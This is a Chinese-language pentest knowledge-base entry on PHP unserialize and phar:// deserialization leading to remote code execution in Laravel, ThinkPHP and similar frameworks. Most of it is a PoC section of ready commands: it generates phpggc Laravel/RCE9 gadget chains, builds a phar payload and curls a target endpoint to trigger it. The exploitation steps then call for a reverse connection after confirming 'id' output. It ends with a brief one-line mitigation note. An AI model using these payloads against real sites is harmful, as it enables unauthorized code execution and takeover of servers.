---
title: PHP 反序列化（POP 链 → RCE / phar 触发）
cve: 无（实现缺陷）
severity: critical
cvss: 9.0
product: Laravel / Symfony / ThinkPHP / 自研 PHP
versions: 任意
ports: 80, 443
keywords: php, 反序列化, pop链, phar, unserialize, rce
entry: unserialize($_COOKIE) / phar:// 文件操作
verified: false
sources: 公开资料整理（实现缺陷类）
---

## 指纹

- Cookie/参数是 `O:8:"stdClass":...` 或 base64 后的序列化串；
- 上传点会做 `file_exists`/`getimagesize` 之类的文件操作，且路径可控。

## 前置条件

- 有 `unserialize` 入口，或可控 `phar://` 路径；框架版本有可用 POP 链。

## PoC

```bash
# 1) 识别序列化数据
echo 'TzoyMDoi...' | base64 -d 2>/dev/null | head -c 60
# 形如 O:4:"Test":1:{...} = 序列化串
```

```bash
# 2) 生成 POP 链（Laravel 用 phpggc，ThinkPHP 用公开链）
git clone https://github.com/ambionics/phpggc.git && cd phpggc
php phpggc Laravel/RCE9 system id -b
# 输出 base64，塞进触发参数

# 3) phar 触发（无 unserialize 也能打）
php -d phar.readonly=0 phpggc -p phar -o /tmp/p.phar Laravel/RCE9 system id
# 上传 p.phar，再让接口用 phar:// 打开（file_exists 等）
curl -s 'https://target/api/avatar?src=phar:///tmp/p.phar/x' | head -c 200
# 判定：执行 id 有回显 = 命中
```

## 利用步骤

1. 找反序列化入口（Cookie/Token/缓存）；
2. `phpggc -l` 找可用链（按框架/版本）；
3. 先 `id`，再回连；
4. 证据：回显/回连日志。

## 修复与缓解

- 不用 `unserialize`（用 JSON）；必须用时加签名/HMAC；禁 `phar://`。

## 参考

- phpggc；PHP 对象注入研究。
